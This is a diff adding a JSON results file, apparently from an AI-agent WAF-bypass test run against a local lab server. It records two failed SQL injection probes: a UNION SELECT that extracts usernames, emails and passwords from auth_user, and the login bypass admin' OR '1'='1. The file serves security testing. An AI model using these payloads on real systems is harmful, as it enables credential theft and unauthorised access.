@@ -1,0 +1,71 @@
+{
+  "campaign": "sqli",
+  "mode": "ai_agent",
+  "target_url": "http://localhost:8000",
+  "dry_run": false,
+  "max_rounds": 4,
+  "timestamp": "2026-11-21T06:39:57.777124+00:00",
+  "summary": {
+    "total_requests": 2,
+    "blocked_count": 0,
+    "bypass_count": 0,
+    "total_endpoints": 2,
+    "bypass_rate_pct": 0.0,
+    "avg_latency_ms": 4066.99,
+    "avg_threat_score": 0.0
+  },
+  "results": [
+    {
+      "endpoint": "/api/v1/vulnerable/books/search/",
+      "method": "GET",
+      "family": "SQL_INJECTION",
+      "target_param": "q",
+      "success": false,
+      "total_rounds": 1,
+      "winning_technique": null,
+      "baseline_payload": "python' UNION SELECT id, username, email, password FROM auth_user --",
+      "final_payload": "python' UNION SELECT id, username, email, password FROM auth_user --",
+      "final_threat_score": null,
+      "rounds": [
+        {
+          "round": 1,
+          "technique": "baseline_probe",
+          "payload": "python' UNION SELECT id, username, email, password FROM auth_user --",
+          "status_code": 0,
+          "is_blocked": false,
+          "waf_action": "ERROR",
+          "threat_score": null,
+          "latency_ms": 4070.9869999991497,
+          "confirmed_bypass": false,
+          "error_message": "[WinError 10061] No connection could be made because the target machine actively refused it"
+        }
+      ]
+    },
+    {
+      "endpoint": "/api/v1/vulnerable/auth/login/",
+      "method": "POST",
+      "family": "SQL_INJECTION",
+      "target_param": "username",
+      "success": false,
+      "total_rounds": 1,
+      "winning_technique": null,
+      "baseline_payload": "admin' OR '1'='1",
+      "final_payload": "admin' OR '1'='1",
+      "final_threat_score": null,
+      "rounds": [
+        {
+          "round": 1,
+          "technique": "baseline_probe",
+          "payload": "admin' OR '1'='1",
+          "status_code": 0,
+          "is_blocked": false,
+          "waf_action": "ERROR",
+          "threat_score": null,
+          "latency_ms": 4062.994100000651,
+          "confirmed_bypass": false,
+          "error_message": "[WinError 10061] No connection could be made because the target machine actively refused it"
+        }
+      ]
+    }
+  ]
+}
